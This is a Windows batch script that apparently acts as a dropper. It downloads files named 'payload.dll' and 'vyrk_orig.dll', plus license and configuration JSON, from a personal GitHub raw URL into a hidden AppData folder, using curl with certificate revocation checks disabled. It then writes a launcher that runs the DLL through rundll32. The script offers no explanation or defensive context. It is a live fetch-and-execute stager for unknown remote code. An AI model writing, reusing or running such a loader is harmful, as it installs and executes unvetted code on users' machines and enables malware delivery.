@echo off
setlocal enabledelayedexpansion
set D=%LOCALAPPDATA%\VYRK
set B=https://raw.githubusercontent.com/Gtx047/Gtx/refs/heads/main

if not exist "%D%" mkdir "%D%"
if not exist "%D%\data" mkdir "%D%\data"

call :get payload.dll "%D%\payload.dll"
call :get vyrk_orig.dll "%D%\vyrk_orig.dll"
call :get init.json "%D%\data\init.json"
call :get lic.json "%D%\data\lic.json"
call :get var.json "%D%\data\var.json"

> "%D%\start.bat" echo @echo off
>> "%D%\start.bat" echo cd /d "%%~dp0"
>> "%D%\start.bat" echo rundll32.exe "%%~dp0payload.dll",Entry

echo Done: %D%
pause
exit /b

:get
curl -s -L --ssl-no-revoke "%B%/%~1" -o "%~2"
if not exist "%~2" ( echo FAILED %~1 & pause & exit /b 1 )
for %%A in ("%~2") do if %%~zA LSS 100 ( echo FAILED small %~1 & pause & exit /b 1 )
echo ok %~1
exit /b